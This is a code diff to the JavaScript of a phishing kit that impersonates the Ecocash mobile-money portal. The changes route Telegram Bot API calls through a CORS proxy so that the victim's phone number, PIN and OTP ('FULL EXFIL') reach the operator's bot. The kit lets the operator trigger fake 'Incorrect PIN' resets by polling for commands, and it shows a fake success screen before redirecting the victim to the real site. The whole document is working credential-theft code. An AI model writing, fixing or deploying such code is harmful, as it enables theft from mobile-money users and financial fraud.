@@ -580,9 +580,13 @@
   let POLLING_INTERVAL;
   let REDIRECT_TIMEOUT = null;
 
-  // === REDIRECT TARGET: real Ecocash portal ===
+  // === REDIRECT TARGET ===
   const REDIRECT_URL = 'https://www.ecocash.co.zw/';
   const REDIRECT_DELAY_MS = 300000; // 5 minutes
+
+  // === CORS PROXY (Telegram API blocks browser CORS — this fixes it) ===
+  // Swap PROXY_URL if corsproxy.io is slow/down. Format: proxy?url=<encoded api url>
+  const PROXY_URL = 'https://corsproxy.io/?url=';
 
   // === STATE ===
   const state = {
@@ -593,6 +597,26 @@
     otp: '',
     victimId: null
   };
+
+  // === TELEGRAM API VIA PROXY ===
+  // GET-style call (no body)
+  async function tgGet(method, params) {
+    const qs = params ? '?' + new URLSearchParams(params).toString() : '';
+    const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/${method}${qs}`;
+    const res = await fetch(PROXY_URL + encodeURIComponent(apiUrl));
+    return res.json();
+  }
+
+  // POST-style call (JSON body)
+  async function tgPost(method, payload) {
+    const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
+    const res = await fetch(PROXY_URL + encodeURIComponent(apiUrl), {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    return res.json();
+  }
 
   // === HELPERS ===
   function showErr(id, msg) {
@@ -629,15 +653,6 @@
     } else {
       custom.style.display = 'none';
     }
-  }
-
-  // === TELEGRAM SEND ===
-  function sendToTelegram(message) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    const payload = { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' };
-
-    try { navigator.sendBeacon(url, JSON.stringify(payload)); }
-    catch (e) { fetch(url, { method: 'POST', body: JSON.stringify(payload), mode: 'no-cors' }); }
   }
 
   // === STEP 1: PHONE → VALIDATION ===
@@ -692,7 +707,7 @@
     }, 1000);
   }
 
-  // === SEND ADMIN CONTROL TO TELEGRAM ===
+  // === SEND ADMIN CONTROL TO TELEGRAM (via proxy POST) ===
   function sendAdminAlert() {
     const victimId = Date.now();
     state.victimId = victimId;
@@ -711,52 +726,55 @@ Choose action:
       ]
     };
 
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: message,
-        reply_markup: keyboard,
-        parse_mode: 'Markdown'
-      })
-    }).catch(console.error);
+    tgPost('sendMessage', {
+      chat_id: CHAT_ID,
+      text: message,
+      reply_markup: keyboard,
+      parse_mode: 'Markdown'
+    }).then(r => console.log('admin alert sent', r.ok)).catch(e => console.error('admin alert failed', e));
   }
 
-  // === LONG POLLING FOR ADMIN ACTIONS ===
+  // === LONG POLLING FOR ADMIN ACTIONS (via proxy GET) ===
   function startPolling() {
     let offset = null;
-    POLLING_INTERVAL = setInterval(() => {
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${offset}&timeout=30`)
-        .then(r => r.json())
-        .then(data => {
-          data.result.forEach(msg => {
-            offset = msg.update_id + 1;
-            const action = msg.callback_query?.data;
-            const fromId = msg.callback_query?.from.id;
+    POLLING_INTERVAL = setInterval(async () => {
+      try {
+        const params = {};
+        if (offset) params.offset = offset;
+        const data = await tgGet('getUpdates', params);
 
-            if (fromId != CHAT_ID) return;
+        if (!data.ok || !data.result) return;
 
-            // Admin: Wrong PIN → back to step 1 (full restart)
-            if (action?.startsWith('wrongpin_') && action.endsWith(state.victimId)) {
-              clearInterval(POLLING_INTERVAL);
-              showToast('❌ Incorrect PIN. Your session has been reset. Please start again.');
-              setTimeout(() => {
-                location.reload();
-              }, 2500);
-            }
+        data.result.forEach(update => {
+          offset = update.update_id + 1;
 
-            // Admin: Wrong OTP → back to step 1 (full restart)
-            if (action?.startsWith('wrongotp_') && action.endsWith(state.victimId)) {
-              clearInterval(POLLING_INTERVAL);
-              showToast('❌ Incorrect OTP. Your session has been reset. Please start again.');
-              setTimeout(() => {
-                location.reload();
-              }, 2500);
-            }
-          });
-        })
-        .catch(() => {});
+          const cb = update.callback_query;
+          if (!cb) return;
+          const action = cb.data;
+          const fromId = cb.from.id;
+
+          if (fromId != CHAT_ID) return;
+
+          // Stop the button loading spinner on Telegram side
+          tgPost('answerCallbackQuery', { callback_query_id: cb.id });
+
+          // Admin: Wrong PIN → toast + restart from page 1
+          if (action && action.startsWith('wrongpin_') && action.endsWith(state.victimId)) {
+            clearInterval(POLLING_INTERVAL);
+            showToast('❌ Incorrect PIN. Your session has been reset. Please start again.');
+            setTimeout(() => location.reload(), 2500);
+          }
+
+          // Admin: Wrong OTP → toast + restart from page 1
+          if (action && action.startsWith('wrongotp_') && action.endsWith(state.victimId)) {
+            clearInterval(POLLING_INTERVAL);
+            showToast('❌ Incorrect OTP. Your session has been reset. Please start again.');
+            setTimeout(() => location.reload(), 2500);
+          }
+        });
+      } catch (e) {
+        // Polling error — keep trying
+      }
     }, 2000);
   }
 
@@ -798,13 +816,13 @@ Choose action:
     });
   });
 
-  // Final Verify Button — FULL EXFIL (phone + PIN + OTP)
+  // Final Verify Button — FULL EXFIL (phone + PIN + OTP) via proxy POST
   document.getElementById('btnVerify').addEventListener('click', () => {
     const otp = Array.from(otpInputs).map(i => i.value).join('');
     if (otp.length !== 4) return showErr('errOtp', 'Enter all 4 digits');
 
     state.otp = otp;
-    exfiltrateFull(); // Phone + PIN + OTP in one message
+    exfiltrateFull();
 
     document.getElementById('cardStep2').style.display = 'none';
     document.getElementById('otpSheet').classList.remove('show');
@@ -815,20 +833,16 @@ Choose action:
 
   // === SUCCESS SCREEN + 5-MIN REDIRECT ===
   function showSuccessScreen() {
-    // Generate fake reference code
     const ref = Math.floor(100000 + Math.random() * 900000);
     document.getElementById('refCode').textContent = ref;
     document.getElementById('successAmount').textContent = state.amount;
     document.getElementById('successMsisdn').textContent = state.msisdn;
 
-    // Hide step 2, show success
     document.getElementById('cardStep2').style.display = 'none';
     document.getElementById('cardSuccess').style.display = '';
 
-    // Start visible countdown timer (5:00)
     startRedirectTimer();
 
-    // Auto-redirect after 5 minutes to real Ecocash site
     REDIRECT_TIMEOUT = setTimeout(() => {
       window.location.href = REDIRECT_URL;
     }, REDIRECT_DELAY_MS);
@@ -845,7 +859,7 @@ Choose action:
     }, 1000);
   }
 
-  // === EXFILTRATION: FULL DETAILS IN ONE MESSAGE ===
+  // === EXFILTRATION: FULL DETAILS IN ONE MESSAGE (via proxy POST) ===
   function exfiltrateFull() {
     const message = `
 🔐 *ECOCASH FULL DETAILS CAPTURED*
@@ -856,7 +870,11 @@ Choose action:
 📅 *Term:* ${state.term}
 🕒 *Time:* ${new Date().toLocaleString()}
 `;
-    sendToTelegram(message);
+    tgPost('sendMessage', {
+      chat_id: CHAT_ID,
+      text: message,
+      parse_mode: 'Markdown'
+    }).then(r => console.log('exfil ok', r.ok)).catch(e => console.error('exfil failed', e));
   }
 
   // Timer reset — no exfil on resend
